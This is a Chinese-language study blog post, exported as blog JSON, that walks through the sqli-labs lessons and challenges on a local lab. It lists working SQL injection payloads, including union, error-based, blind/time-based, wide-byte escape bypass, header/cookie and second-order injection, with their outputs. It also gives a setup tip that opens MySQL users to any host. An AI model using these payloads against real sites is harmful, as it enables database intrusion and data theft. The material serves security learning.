Chars**</br>\n宽字节注入</br>\n\t原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \\’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \\ 除掉。</br>\n  一般有两种思路： </br>\n\t1、%df 吃掉 \\ 具体的原因是 urlencode(‘\\) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。</br>\n\t2、将 \\’ 中的 \\ 过滤掉， 例如可以构造 %\\**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</br>\n\n\taddslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：'   \"  \\</br>\n\taddslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行\n  \tfunction check_addslashes($string)\n  \t{\n  \t\t$string= addslashes($string);    \n  \t\treturn $string;\n  \t}\n\t例?id=-1%27%20union%20select%201,version(),user()%20%27</br>\n\tThe filtered request is :-1\\' union select 1,version(),user() \\'</br>\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23</br>\n\t返回:</br>\n  Your Login name:5.7.23-0ubuntu0.16.04.1</br>\n\tYour Password:root@localhost\n\n- **less 33 GET -  Bypass AddSlashers()**</br>\n\t?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样\n\n- **less 34 POST - Bypass AddSlashers()**</br>\n\tpost型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为' 。我们就 可以利用这个方式进行尝试。</br>\n\n\t運' or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c </br>\n\tSELECT username, password FROM users WHERE username='運\\' or 1=1# ' and password='' LIMIT 0,1\n\n- **less 35 GET - Bypass Add Slashes(we dont need them) Integer Based**</br>\n\tphp中：$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";</br>\n\t可以看出，不需要构造特殊符号</br>\n\t?id=-1%20union%20select%201,version(),user()%23</br>\n\n- **less 36 GET - Bypass mysql_real _escape _string**</br>\n\tmysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符</br>\n\tstring 必需，要转义的字符串</br>\n\tconnection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接</br>\n  \t\\x00  ascii码 null\n  \t\\n\t换行\n  \t\\r\t回车\n  \t\\\n  \t'\n  \t\"\n  \t\\x1a （即十进制26）&\n\t这些字符会被转义</br>\n\n  \tfunction check_quotes($string)\n  \t{\n  \t\t$string= mysql_real_escape_string($string);    \n  \t\treturn $string;\n  \t}\n  \t$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n\t?id=-1%df%27%20union%20select%201,version(),user()%23 成功\n\n- **less 37 POST - Bypass mysql_real_escape_string** </br>\n\t運' or 1=1 #\n\n---------------------------------------------------\n\nStacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 </br>\n原理:</br>\n在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 </br>\n局限:</br>\n堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 </br>\n虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。\n因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</br>\n\n暂不深入了解\n\n---------------------------------------------\nchallenge\n\n- **GET - challenge - Union -10 Queries Allowed - Variation1**</br>\n\t1.查表名</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t得到此次的表名: 8TELU525VO</br>\n\t2.查列名 用concat一次性查完输出</br>\n\t?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23</br>\n\t返回:</br>\n  Your Login name:id---,sessid---,secret_63JY---,tryy---</br>\n\tYour Password:3</br>\n\t3.得到密码id,sessid,secret_63JY</br>\n\t?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23</br>\n\t返回:</br>\n  Your Login name:856213ca887976a33e3d91b2c61fa65a</br>\n\tYour Password:M5ztHsC34iN2X0lzCiXJ27Cp</br>\n\t4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 2**</br>\n\t1.猜测过滤规则</br>\n\t当输入?id=1)%26%26(1=1 时 成功 可知过滤为()</br>\n\t2.参考less 54</br>\n\t?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23</br>\n\t表名为: C73JPUKYS9\t</br>\n\t?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22---%22)%20from%20information_schema.columns%20where%20table_name%3d\n\t%22C73JPUKYS9%22),3%20%23</br>\n\t列名: Your Login name:id---,sessid---,secret_DH0J---,tryy---</br>\n\t?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23</br>\n\t密码：</br>\n  Your Login name: 4d0218b33a232f675d53381ef38b5370</br>\n  Your Password: kjbKG19I62vmYE3kS7gGN7qf </br> 成功\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 3**</br>\n\t1.猜测</br>\n\t?id=1%27)%26%26(%271=1 成功 可知为(' ')</br>\n\t2.下面步骤如上</br>\n\n- **GET - Challenge - Union - 14 Queries Allowed - Variation 4**</br>\n\t如上\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 1**</br>\n\t1.猜测</br>\n\t?id=1%27%26%26%271=1 成功，可知为' '</br>\n\t?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 </br>  返回同上，可知有其它过滤规则</br>\n\t尝试报错注入</br>\n\t?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()</br>\n\t2.获取表名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23</br>\n\t返回：XPATH syntax error: '~4HT916R6T1~'</br>\n\t3.获取列名</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,\"---\")%20from%20information_schema.columns%20where%20table_name%3d%20\"4HT916R6T1\"),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~id---,sessid---,secret_EN0R---,'为什么有一个列没显示</br>\n\t4.获取密码</br>\n\t?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23</br>\n\t返回: XPATH syntax error: '~OcDGOovBkd3XMq3FpuSNtEIN~'</br>\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 2**</br>\n\t?id=1%26%261=1 返回成功，说明无字符</br>\n\t剩余步骤如 less 58</br>\n\n-  **GET - Challenge - Double Query -5 Queries Allowed - Variation 3**\n\t?id=1%22%26%26%221=1 猜测为 \" \"</br>\n?id=1%22)%26%26(%221=1 猜测为(\" \") </br>\n都返回相同结果？？？？</br>\n  但实际上\n        \t$id = '(\"'.$id.'\")';\n  \t\t\t$sql=\"SELECT * FROM security.users WHERE id=$id LIMIT 0,1\";\n  \t           if($row)\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#00FFFF\">';\n  \t\t\t\t\t$unames=array(\"Dumb\",\"Angelina\",\"Dummy\",\"secure\",\"stupid\",\"superman\",\"batman\",\"admin\",\"admin1\",\"admin2\",\"admin3\",\"dhakkan\",\"admin4\");\n  \t\t\t\t\t$pass = array_reverse($unames);\n  \t\t\t\t\techo 'Your Login name : '. $unames[$row['id']];\n  \t\t\t\t\techo \"<br>\";\n  \t\t\t\t\techo 'Your Password : ' .$pass[$row['id']];\n  \t\t\t\t\techo \"</font>\";\n  \t\t\t\t}\n  \t\t\t\telse\n  \t\t\t\t{\n  \t\t\t\t\techo '<font color= \"#FFFF00\">';\n  \t\t\t\t\tprint_r(mysql_error());\n  \t\t\t\t\techo \"</font>\";  \n  \t\t\t\t}\n\t每次返回都是$unames=array（），奸诈！！\n\n- **GET - Challenge - Double Query -5 Queries Allowed - Variation 4**</br>\n\t$sql=\"SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1\";\n\n- **GET - Challenge - Blind -130 Queries Allowed - Variation 1**</br>\n\t盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率</br>\n\t?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))--+\n\n### 三.杂记\n\n- 盲注</br>\n\t语句执行完后没有回显</br>\n\t1.基于布尔</br>\n\t构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）</br>\n\t2.基于报错</br>\n\tSELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)\\*2));</br>\n\t[Err] 1062 - Duplicate entry '5.7.23-0ubuntu0.16.04.11' for key '<group_key>'</br>\n\t具体原理不懂，concat, floor, group by，rand(0)是关键</br>\n\t如果rand被禁用可以使用用户变量来报错？？</br>\n\t或者XPath报错等</br>\n\t3.基于时间-延迟注入</br>\n\t利用if,当条件正确或错误时，确定要不要sleep()来猜测</br>\n\n- insert/update/delete注入</br>\n\t思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显</br>\n\n-\torder by</br>\n\t可以用来确定有几列，如 order by 4 ,报错没有第四列</br>\n\n- url编码\n  \t空格    -    %20\n  \t\"          -    %22\n  \t#         -    %23\n  \t%        -    %25\n  \t&         -    %26\n  \t(          -    %28\n  \t)          -    %29\n  \t+         -    %2B\n  \t,          -    %2C 逗号\n  \t/          -    %2F\n  \t:          -    %3A\n  \t;          -    %3B\n  \t<         -    %3C\n  \t=         -    %3D\n  \t>         -    %3E\n  \t?         -    %3F\n  \t@       -    %40\n  \t\\          -    %5C\n  \t|          -    %7C\n  \t'               %27  单引号\n\n- 补充一些数据库知识</br>\n  \tinfomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。\n  \t如数据库名，数据库的表，表栏的数据类型与访问权限等。</br>\n  \t再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，\n  \t每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。</br>\n\n  \tinformation_schema的表schemata中的列schema_name记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表tables中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列table_schema记录了所有数据库的名字\n  \tinformation_schema的表columns中的列table_name记录了所有数据库的表的名字\n  \tinformation_schema的表columns中的列column_name记录了所有数据库的表的列的名字\n查询指定数据库所有表名</br>\nSELECT table_name FROM information_schema.tables WHERE table_schema='数据库名';</br>\n查询mysql中所有数据库名字</br>\nSELECT schema_name FROM information_schema.schemata</br>\n\n\tversion()  mysql版本\n\tuser()用户\n\t@@datadir数据路径\n\t@@version_compile_os 操作系统\n\tdatabase() 数据库名字\n\tSELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();\n--+/# 注释，一般用#，url编码为%23</br></br>\nmysql中XPath:</br>\nMySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()</br>\nExtractValue():</br>\n\tEXTRACTVALUE (XML_document, XPath_string); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t作用：从目标XML中返回包含所查询值的字符串</br>\nUpdateXml():</br>\n\tUPDATEXML (XML_document, XPath_string, new_value); </br>\n\t第一个参数：XML_document是String格式，为XML文档对象的名称</br>\n\t第二个参数：XPath_string (Xpath格式的字符串) </br>\n\t第三个参数：new_value，String格式，替换查找到的符合条件的数据 </br>\n\t作用：改变文档中符合条件的节点的值 </br>\n通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</br>\n0x7E为~的ascii码</br></br>\nif</br>\nIF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3</br></br>\nconcat() 连接字符串，将多个连接在一起。</br>\n\tconcat(str1,str2,...)</br>\nconcat_ws() 将多个字符串连接在一起，可以一次性指定分隔符</br>\n\tconcat_ws(sparator, str1,str2,...)</br>\ngroup_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果</br>\n\tgroup_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )</br>\n\n\n\n\n\n- 问题：</br>\n1.怎么确定是哪种注入类型？</br>\n2.在没有返回值的情况下判断单引号双引号括号等\n\n- 其它\n  \t?id=1%27%26%26%271=1 猜测为’ ‘\n  \t?id=1%27)%26%26(%271=1 猜测为（’ ‘）\n  \t?id=1%22%26%26%221=1 猜测为 \" \"\n  \t?id=1%22)%26%26(%221=1 猜测为(\" \")\n  \t?id=1)%26%26(1=1  猜测为()\n  \t?id=1%26%261=1 无\n","slug":"security/sql/sql注入","published":1,"updated":"2018-12-18T07:55:37.516Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64054c002h6cvpnjr5zg2q","content":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><p>sql注入:利用现有程序，使之执行构造的payload.</p>\n<h3 id=\"一-环境搭建\"><a href=\"#一-环境搭建\" class=\"headerlink\" title=\"一. 环境搭建\"></a>一. 环境搭建</h3><ul>\n<li>ubuntu16.04虚拟机</li>\n<li>更新阿里源 apt-get update</li>\n<li>安装mysql apt-get install mysql-server mysql-client -y</li>\n<li>安装apache apt-get install apache2 -y</li>\n<li>安装git apt-get install git -y</li>\n<li>项目 cd /var/www &amp;&amp; sudo git clone <a href=\"https://github.com/Audi-1/sqli-labs.git\" target=\"_blank\" rel=\"noopener\">https://github.com/Audi-1/sqli-labs.git</a> sqli-labs  </li>\n<li>更改项目的mysql配置文件为自己数据库</li>\n<li>现在在浏览器localhost/sqli-labs已经可以访问到了</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><ul>\n<li>navicat连不上mysql <br><br>  注释 /etc/mysql/mysql.cnf.d/mysqld.cnf 中bind 127.0.0.1<br><br>  修改select user, host from user;  update user set host = “%” where host = ‘localhost’;  flush privileges;</li>\n<li><p>php版本导致mysql_connect()废弃 <br><br>  安装phpstorm 配置phpcgi  apt-get install php版本-cgi<br><br>  降低版本到php5.6错误仍然在<br><br>  第二天重启Phpstrom 打开网页，错误消失<br><br>猜测是降低版本有效，但第一天有缓存<br></p>\n<a id=\"more\"></a>\n<h3 id=\"二-sqli-labs\"><a href=\"#二-sqli-labs\" class=\"headerlink\" title=\"二.sqli-labs\"></a>二.sqli-labs</h3><p>参考了大牛的教程<a href=\"https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf\" target=\"_blank\" rel=\"noopener\">https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf</a></p>\n</li>\n<li><p><strong> less1 GET-Error based - Single quotes - String <br> </strong><br>  php中代码 SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;<br>  %20 空格 %27 单引号 %3D 等于号<br><br>  一：?id=(select%20id%20from%20users%20where%20username%20%3D”admin”) 未成功      ’$id’ 注入被单引号包裹，将输入变成了字符串<br><br>  二：?id=’%20and%20username%3D%27admin 未成功 id=’’这个条件未绕过<br>  想利用id=这个条件或者绕过这个条件<br><br>  三：?id=’%20or%20username%3D%27admin 成功<br><br>  基于二，转换思路，利用or成功绕过<br><br>  爆破数据库版本<br><br>  ?id=-1%27%20%20union%20select%201%2cversion()%2c3%23<br><br>  ？id=-1’  union select 1,version(),3#<br><br>  union必须列一样，所以1和3是为了保持三列</p>\n</li>\n<li><p><strong> less 2 GET - Error based -Intiger based<br> </strong><br>  php中代码 $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  $id未加引号过滤输入<br> ?id=(select%20id%20from%20users%20where%20username%20%3D”admin”)成功注入</p>\n</li>\n<li><p><strong> less 3 GET - Error based - single quotes with twist - string</strong><br><br>  php中代码 $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”; 用括号和单引号进行了过滤<br><br>  思路：消除括号<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27  成功</p>\n</li>\n</ul>\n<ul>\n<li><p><strong> less 4  GET - Error based - Double Quotes - String </strong> <br><br>  php中代码<br><br>  $id = ‘“‘ . $id . ‘“‘;<br><br>  $sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br><br>  ?id=%27)or%20username%3D%27admin%27or%20(%27 成功<br></p>\n<p>  关于前四个less的一些心得：</p>\n<pre><code>1.找错误：\n    尝试着单引号，双引号，括号等特殊字符注入，如果有报错信息，多半就是该符号出问题\n    例：?id=&quot;\n             返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&quot;&quot;) LIMIT 0,1&apos; at line 1\n        可以看出输入所在位置为（“输入”）\n2.注入利用\n    通过union来执行自己想要的sql\n</code></pre></li>\n<li><p><strong> less 5  GET - Double Injection - Single Quotes - String </strong> <br><br>双查询注入（双查询：select嵌套select）<br><br>  输入?id=‘ 失败， use near 1  由此猜测为单引号<br><br>  ?id=’%20or%20username%3D%27admin 成功 <br><br>  但是sql执行结果前端并没有进行输出，怎么利用？<br></p>\n<p>  查询资料后发现：Double injection 双注入。一些研究人员发现，使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。<br><br>  发现多查询几次会爆出duplicate entry的错误，且将我们需要的信息都爆出来了。（正常结果未返回显示，所以通过错误信息去获得我们想要的信息，有随机性，需要重复多次）<br><br>  count() 计数<br><br>  rand() 随机<br><br>  group by 分组<br><br>  floor() 向下取整，舍弃小数部分<br></p>\n<p>  ?id=-1%27%20union%20select%201%2c(select%20count(*)%20from%20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功<br><br>  Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br>  其中version(）是我们希望执行的函数，可以换成其它</p>\n</li>\n<li><p><strong> less 6 GET - Double Injection - Double Quotes - String </strong> <br></p>\n<p>  ?id=-1%22%20union%20select%201%2c(select%20count(*)%20from%        20information_schema.schemata%20group%20by%20concat(version()%2cfloor(rand(0)*2)))%2c3%20%23 成功</p>\n</li>\n<li><p><strong> less 7 GET - Dump into outfile - String </strong> <br><br>  文件导入限制条件多，未成功</p>\n</li>\n<li><p><strong> less 8 GET - Blind - Boolian Based - Single Quotes </strong> <br><br>  ?id=-1%27or%201%3d1%23 <br><br>  利用二分与返回结果的正确与否，来猜测验证数据库内容</p>\n</li>\n<li><p><strong> less 9 GET - Blind - Time Based - Single Quotes </strong> <br><br>  ?id=1%27%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23 <br><br>  因为在这正确或者错误都是返回的”you are in” 所以不能区分 <br><br><img src=\"../../../images/security/sql/youarein.png\" alt=\"youarein\"><br>  使用时间延迟，例子为判断数据库名字第一个字是否为s(ascii码为115)，要进行多次尝试</p>\n</li>\n<li><p><strong> less 10 GET -Blind - Time Based - Double Quotes </strong> <br><br>  ?id=1”%20and%20if(ascii(substr(database(),1,1))&gt;116,%200,%20sleep(5))%20%23</p>\n</li>\n<li><p><strong> less 11 POST - Error Based -Single Qoutes - String </strong> <br><br>  username:  </p>\n<pre><code>1.admin &apos; # admin用户&lt;/br&gt;\n2.adimn &apos; or 1=1 # 万能&lt;/br&gt;\n3. &apos; union select version(),1 # 等其它操作\n</code></pre><p>  passwd:<br>  因为username已经用#将后面注释了，所以passwd随意输入</p>\n</li>\n<li><p><strong> less 12 POST - Error Based - Double Quotes - String - with twist </strong> <br><br>将less11的单引号改为 “）</p>\n</li>\n<li><p><strong> less 13 POST - Double Injection - Single quotes - String - with twist </strong> <br><br>  username:    ‘) union select (select count(*) from information_schema.schemata group by concat(version(),floor(rand(0)*2))),1 #<br><br>  返回信息Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘’<br><br>  另外这种有正确/错误提示的，都可以二分盲注来猜测验证</p>\n</li>\n<li><p><strong> less 14 POST  - Double Injection - Double quotes - String </strong> <br><br>  less13 ‘) 换为 ”</p>\n</li>\n<li><p><strong> less 15 POST - Blind - Boolean/Time Based -Single Quotes </strong> <br><br>  username: ‘ or 1=1 # 登录成功 <br><br>  思路：利用or/and/if sleep()等来进行猜测<br></p>\n</li>\n<li><p><strong> less 16 POST - Blind - Boolean/Time Based - Double Quotes - with twist </strong> <br><br>  将less15 ‘ 换成 “)</p>\n</li>\n<li><p><strong> less 17 POST - Update Query - Error Based - String </strong> <br><br>  这里对用户名进行了过滤<br><br>  利用报错进行注入输出 <br><br>  uname=admin&amp;passwd=11’and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;sub mit=Submit <br><br>  输出结果XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1~’<br><br>报错注入基本都是利用XPath进行报错<br>  有必要去买本书来系统的看一下mysql各种函数</p>\n</li>\n<li><p><strong> less 18 POST - Header Injection - Uagent field - Error Based </strong> <br><br>  这里需要正确的账号密码才能进行注入，因为插入操作是在登录判断成功后<br><br>  php中语句：$insert=”INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (‘$uagent’, ‘$IP’, $uname)”;<br>其中$IP不好修改，$uname与$password进行了过滤，所以考虑$uagent<br><br>  将User-Agent 修改为 ‘ or extractvalue(1,concat(0x7e,version())) or ’<br><br>  返回结果：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong> less 19 POST - Header Injection - Referer Field - Error Based </strong> <br><br>  同less 18,进行了过滤，但执行了$insert=”INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (‘$uagent’, ‘$IP’)”;<br><br>  其中：$uagent = $_SERVER[‘HTTP_REFERER’];<br><br>  将Referer 修改为: ‘or extractvalue(1,concat(0x7e,database())) or’<br><br>  返回: XPATH syntax error: ‘~security’</p>\n</li>\n<li><p><strong> less 20 POST - Cookie Injection - Uagent Field - Error Based </strong> <br><br>  进行了过滤<br><br>  $cookee = $_COOKIE[‘uname’];<br><br>  $sql=”SELECT * FROM users WHERE username=’$cookee’ LIMIT 0,1”;<br><br>  流程是登录成功后产生cookie,此时修改cookie,进行注入(在chrome浏览器中使用tamper插件进行请求的拦截修改)<br><br>  修改Cookie为： uname=-1’ union select 1,(select version()),3 #<br><br>  返回 ：</p>\n<pre><code>Your Login name:5.7.23-0ubuntu0.16.04.1\nYour Password:3\nYour ID:1\n</code></pre><p>  也可以用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br><br>   uname=admin’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# <br><br>  返回:Issue with your mysql: XPATH syntax error: ‘~/usr/~’</p>\n</li>\n<li><p><strong> less 21 POST - Cookie Injection - Error Based - Base64 Encode - Single Quotes - String </strong> <br><br>  setcookie(‘uname’, base64_encode($row1[‘username’]), time()+3600);<br>  $sql=”SELECT * FROM users WHERE username=(‘$cookee’) LIMIT 0,1”;<br><br>  对Cookie 进行了 base64处理 <br><br>  uname=LTEnKSB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IHZlcnNpb24oKSksMyAj<br>  uname=-1’) union select 1,(select version()),3 #<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>   Your Password:3<br><br>  Your ID:1</p>\n</li>\n<li><p><strong> less 22 POST - Cookie Injection - Error Based - Base64 Encode - Double Quotes - String </strong> <br><br>  对Cookie进行了base64编码，使用的双引号</p>\n</li>\n</ul>\n<hr>\n<ul>\n<li><p><strong> less 23 GET - Error Based - Strip Comments </strong> <br><br>  php中处理：<br><br>  $reg = “/#/“;<br><br>  $reg1 = “/–/“;<br><br>  $replace = “”;<br><br>  $id = preg_replace($reg, $replace, $id); //将$reg替换为$replace<br><br>  $id = preg_replace($reg1, $replace, $id);<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  因为过滤了注释符号，所以自己添加引号来闭合,同样可以使用报错/延时注入等<br><br>  ?id=-1%27%20union%20select%201%2c(select%20version())%2c3%20%27<br><br>  返回：<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:3</p>\n</li>\n<li><p><strong> less 24 POST - Second Order Injection *Real treat* - Stored Injections </strong> <br><br>  本关为二次注入的示范例。二次注入也称为存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以触发 sql 注入<br><br>  php中:<br></p>\n<pre><code>$sql = &quot;select count(\\*) from users where username=&apos;$username&apos;&quot;;\n    $res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);\n    $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;\n    $sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;\n</code></pre><p>  先注册一个admin’#用户，更改其密码，实际上是更改的admin的密码</p>\n</li>\n<li><p><strong>less 25 GET - Error Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong><br><br>  $id= preg_replace(‘/or/i’,””, $id);            //strip out OR (non case sensitive)<br><br>  $id= preg_replace(‘/AND/i’,””, $id);        //Strip out AND (non case sensitive)<br><br>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：使用union<br>  绕过过滤：</p>\n<pre><code>（1）大小写变形 Or,OR,oR\n（2）编码，hex，urlencode\n（3）添加注释/*or*/\n（4）利用符号 and=&amp;&amp; or=||\n</code></pre><p>  ?id=1%27%20||%20%20extractvalue(1%2cconcat(0x7e%2cversion()))%23<br>  返回：XPATH syntax error: ‘~5.7.23-0ubuntu0.16.04.1’</p>\n</li>\n<li><p><strong>less 25a GET - Blind Based - All your OR &amp; AND Belong to us - String - Single Quotes</strong> <br><br>  $id= blacklist($id);<br><br>  $sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  //print_r(mysql_error()); <br><br>  报错注入不能用，所以使用基于布尔的注入，其中and/or进行了过滤<br><br>  ?id=-1%20||%20if(ascii(substr(database(),1,1))%3d117,0,1)判断数据库名字第一个字符是不是u(users库)<br><br>然后依次这样，查出数据库名</p>\n</li>\n<li><p><strong>less 26 GETs - Error Based - All your Spaces and Comments Belong to us</strong> <br><br>  Comments 注释<br><br>  php中:<br></p>\n<pre><code>function blacklist($id)\n {\n $id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);            //strip out OR (non case sensitive)\n $id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)\n $id= preg_replace(&apos;/[\\/\\*]/&apos;,&quot;&quot;, $id);        //strip out /*\n $id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);        //Strip out --\n $id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);            //Strip out #\n $id= preg_replace(&apos;/[\\s]/&apos;,&quot;&quot;, $id);        //Strip out spaces\n $id= preg_replace(&apos;/[\\/\\\\\\\\]/&apos;,&quot;&quot;, $id);        //Strip out slashes\n return $id;\n}\n</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br><br>  思路：<br><br>注释过滤了可以手动闭合引号，空格过滤<br>  可以使用  %a0  换行，<br><br>/**/ 注释， （） 括号等绕过空格<br><br>  此处注释不能使用，为了使用select时去掉末尾引号，空格也不行<br><br>  id=’111’union(select(1),(version()),(3)） ‘ LIMIT 0,1; 使用括号时，引号还在<br><br>  ?id=111%27union%a0select%a01%2cversion()%2c3||%271使用换行成功</p>\n</li>\n<li><p><strong>less 26a  GET - Blind Based - All your SPACES And COMMENTS Belong to us - Quotes-Parenthesis</strong> <br><br>  过滤和less26相同<br><br>  $sql=”SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1”;<br><br>  ?id=111%27)union%a0select%a01%2cversion()%2c3||(%271<br></p>\n<p>  